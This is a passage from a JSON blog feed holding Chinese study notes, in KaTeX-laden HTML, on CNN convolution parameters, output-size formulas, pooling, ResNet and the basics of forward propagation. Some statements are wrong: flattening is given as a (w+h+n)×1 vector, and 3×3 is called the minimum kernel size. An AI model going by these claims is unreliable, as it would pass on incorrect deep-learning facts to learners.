class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">m</span></span></span></span> 个卷积核，则输出数据将有 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">m</span></span></span></span> 维。</p>\n</li>\n</ul>\n</blockquote>\n<p><mark>卷积层涉及参数</mark>：</p>\n<ol>\n<li>滑动窗口 步长（stride）<br />\n步长越小，越<strong>细粒度</strong>地提取特征，得到的特征越丰富<br />\n（一般为 1）</li>\n<li>卷积核尺寸<br />\n尺寸越小，越<strong>细粒度</strong>地提取特征，得到的特征越丰富<br />\n（最小为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>3</mn><mo>×</mo><mn>3</mn></mrow><annotation encoding=\"application/x-tex\">3\\times 3</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.7278em;vertical-align:-0.0833em;\"></span><span class=\"mord\">3</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord\">3</span></span></span></span>）</li>\n<li>边缘填充（pad）<br />\n为解决 <strong>边界数据利用不充分</strong> 的问题（靠近中心的数据在卷积中会被计算更多次），<br />\n在数据边缘填充一圈 <strong>0</strong>，使数据更靠近中心</li>\n<li>卷积核个数<br />\n即输出数据（特征图）的维度<br />\n（每个卷积核都会 <strong>各自</strong> 进行参数更新）</li>\n</ol>\n<p><mark>卷积结果计算公式</mark>：</p>\n<ul>\n<li>长度：<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>H</mi><mn>2</mn></msub><mo>=</mo><mfrac><mrow><msub><mi>H</mi><mn>1</mn></msub><mo>−</mo><msub><mi>F</mi><mi>H</mi></msub><mo>+</mo><mn>2</mn><mi>P</mi></mrow><mi>s</mi></mfrac><mo>+</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">H_2=\\frac{H_1-F_H+2P}s+1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.2336em;vertical-align:-0.345em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8886em;\"><span style=\"top:-2.655em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">s</span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.4103em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.08125em;\">H</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3173em;\"><span style=\"top:-2.357em;margin-left:-0.0813em;margin-right:0.0714em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span><span class=\"mbin mtight\">−</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">F</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.3567em;margin-left:-0.1389em;margin-right:0.0714em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.08125em;\">H</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1433em;\"><span></span></span></span></span></span></span><span class=\"mbin mtight\">+</span><span class=\"mord mtight\">2</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">P</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.345em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord\">1</span></span></span></span></li>\n<li>宽度：<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>W</mi><mn>2</mn></msub><mo>=</mo><mfrac><mrow><msub><mi>W</mi><mn>1</mn></msub><mo>−</mo><msub><mi>F</mi><mi>W</mi></msub><mo>+</mo><mn>2</mn><mi>P</mi></mrow><mi>s</mi></mfrac><mo>+</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">W_2=\\frac{W_1-F_W+2P}s+1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.2336em;vertical-align:-0.345em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8886em;\"><span style=\"top:-2.655em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">s</span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.4103em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3173em;\"><span style=\"top:-2.357em;margin-left:-0.1389em;margin-right:0.0714em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span><span class=\"mbin mtight\">−</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">F</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.3567em;margin-left:-0.1389em;margin-right:0.0714em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">W</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1433em;\"><span></span></span></span></span></span></span><span class=\"mbin mtight\">+</span><span class=\"mord mtight\">2</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">P</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.345em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord\">1</span></span></span></span></li>\n</ul>\n<p>其中，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>W</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">W_1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>、<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>H</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">H_1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 表示输入的宽度、长度；<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>W</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">W_2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>、<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>H</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">H_2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 表示输出特征图的宽度、长度；<br />\n<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>F</mi></mrow><annotation encoding=\"application/x-tex\">F</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span></span></span></span> 表示卷积核长和宽的大小；<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>S</mi></mrow><annotation encoding=\"application/x-tex\">S</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span></span></span></span> 表示滑动窗口的步长；<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>P</mi></mrow><annotation encoding=\"application/x-tex\">P</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span></span></span></span> 表示边界填充 (加几圈 0)。</p>\n<p>所以特征图的大小 不一定 小于输入数据的大小。通过更改卷积的参数，也可以让输入输出的数据大小相同</p>\n<h2 id=\"池化\"><a class=\"anchor\" href=\"#池化\">#</a> 池化</h2>\n<p>（<mark>数据压缩</mark>）</p>\n<p>关于<strong>池化</strong> (pooling)：参考文章</p>\n<blockquote>\n<p><strong>max pooling</strong>：选取区域内最大的</p>\n<p>average pooling：选取区域内的平均值（<strong>已淘汰</strong>）</p>\n</blockquote>\n<p>没有矩阵计算（所以池化层<strong>不算入卷积神经网络的一层</strong>）</p>\n<p>池化在压缩数据的同时，势必会导致部分<strong>信息丢失</strong>，因此可以考虑在下一层卷积中，将特征图个数<strong>翻倍</strong>，以弥补损失。</p>\n<h2 id=\"特征图变化\"><a class=\"anchor\" href=\"#特征图变化\">#</a> 特征图变化</h2>\n<blockquote>\n<p>卷积 =&gt; 提取特征 =&gt; 增加（减少）特征图个数</p>\n<p>池化 =&gt; 数据压缩 =&gt; 减少特征图体积</p>\n<p>转化 =&gt; 把 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span> 个特征图 (<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>w</mi><mo>×</mo><mi>h</mi><mo>×</mo><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">w\\times h\\times n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6667em;vertical-align:-0.0833em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">w</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.7778em;vertical-align:-0.0833em;\"></span><span class=\"mord mathnormal\">h</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span>) 转化为特征向量 (<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mi>w</mi><mo>+</mo><mi>h</mi><mo>+</mo><mi>n</mi><mo stretchy=\"false\">)</mo><mo>×</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">(w+h+n)\\times 1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">w</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.7778em;vertical-align:-0.0833em;\"></span><span class=\"mord mathnormal\">h</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord\">1</span></span></span></span>)</p>\n</blockquote>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1707231170/Typera/2024/02/5463baf1c6a18764dff982d64d72cf69.png\" alt=\"image-20240206225241162\" /></p>\n<h1 id=\"残差网络\"><a class=\"anchor\" href=\"#残差网络\">#</a> 残差网络</h1>\n<blockquote>\n<p><strong>问题</strong>：神经网络的层数越多，效果越好吗？<br />\n<strong>不是的</strong><br />\n本质上神经网络中间的几层都是在做特征提取的事情，而提取 50 次特征<strong>不一定</strong>比提取 20 次特征的效果好</p>\n<p>** 因此，深度学习出现了如下图所示的状况： **<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1707280009/Typera/2024/02/5e6d212fa80493069a41ab6eed57da2e.png\" alt=\"ae5752a3990aac550bbf1cac2c551d3b.png\" /></p>\n</blockquote>\n<p>（<strong>ResNet</strong>：2015 年提出的解决方法）</p>\n<p><strong>核心思想</strong>：始终保留增加的层，即使增加的层表现得不好（损失值变大），将</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1707280696/Typera/2024/02/9da84b8d0188b72f91fe3e59d89bc367.png\" alt=\"image-20240207123814277\" /></p>\n",
            "tags": [
                "深度学习",
                "毕业设计",
                "机器学习"
            ]
        },
        {
            "id": "https://www.sycamore.top/Graduation/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/",
            "url": "https://www.sycamore.top/Graduation/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/",
            "title": "深度学习神经网络",
            "date_published": "2024-02-02T19:08:58.000Z",
            "content_html": "<h1 id=\"神经网络基本原理\"><a class=\"anchor\" href=\"#神经网络基本原理\">#</a> 神经网络基本原理</h1>\n<blockquote>\n<p><strong>解决的问题</strong>：特征提取（哪些特征比较合适）<br />\n<strong>应用</strong>：检测、识别</p>\n</blockquote>\n<h2 id=\"前向传播\"><a class=\"anchor\" href=\"#前向传播\">#</a> 前向传播</h2>\n<p><strong>前向传播</strong>：得出损失值</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1706939403/Typera/2024/02/f7e4c82c866ee04828bd995f607a2d5a.png\" alt=\"image-20240203135000064\" /><br />\n（其中 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">x</span></span></span></span> 为输入数据，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>W</mi></mrow><annotation encoding=\"application/x-tex\">W</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span></span></span></span> 为权重参数，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>L</mi></mrow><annotation encoding=\"application/x-tex\">L</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\">L</span></span></span></span> 为损失值)</p>\n<h3 id=\"得分函数\"><a class=\"anchor\" href=\"#得分函数\">#</a> 得分函数</h3>\n<p>线性函数：从<strong>输入</strong> -&gt; <strong>输出</strong>的映射<br />\n其结果表示输入数据对于每个分类的得分。</p>\n<p><strong>数学表示</strong>：<br />\n<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo separator=\"true\">,</mo><mi>W</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mi>W</mi><mi>x</mi><mtext> </mtext><mo stretchy=\"false\">(</mo><mo>+</mo><mi>b</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">f(x, W)=Wx\\ (+b)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"mord mathnormal\">x</span><span class=\"mspace\"> </span><span class=\"mopen\">(</span><span class=\"mord\">+</span><span class=\"mord mathnormal\">b</span><span class=\"mclose\">)</span></span></span></span><br />\n 其中 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">x</span></span></span></span> 为图像，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>W</mi></mrow><annotation encoding=\"application/x-tex\">W</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span></span></span></span> 为权重参数，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6944em;\"></span><span class=\"mord mathnormal\">b</span></span></span></span> 为偏置参数。<br />\n通常 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>W</mi></mrow><annotation encoding=\"application/x-tex\">W</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span></span></span></span> 对结果起决定作用，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6944em;\"></span><span class=\"mord mathnormal\">b</span></span></span></span> 对结果起微调作用；</p>\n<p>假设图片为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">[</mo><mn>32</mn><mo>×</mo><mn>32</mn><mo>×</mo><mn>3</mn><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">[32\\times32\\times3]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">[</span><span class=\"mord\">32</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.7278em;vertical-align:-0.0833em;\"></span><span class=\"mord\">32</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">3</span><span class=\"mclose\">]</span></span></span></span>，共有 10 个分类，<br />\n则 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">x</span></span></span></span> 为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>3072</mn><mo>×</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">3072\\times1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.7278em;vertical-align:-0.0833em;\"></span><span class=\"mord\">3072</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord\">1</span></span></span></span>, <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>W</mi></mrow><annotation encoding=\"application/x-tex\">W</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span></span></span></span> 为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>10</mn><mo>×</mo><mn>3072</mn></mrow><annotation 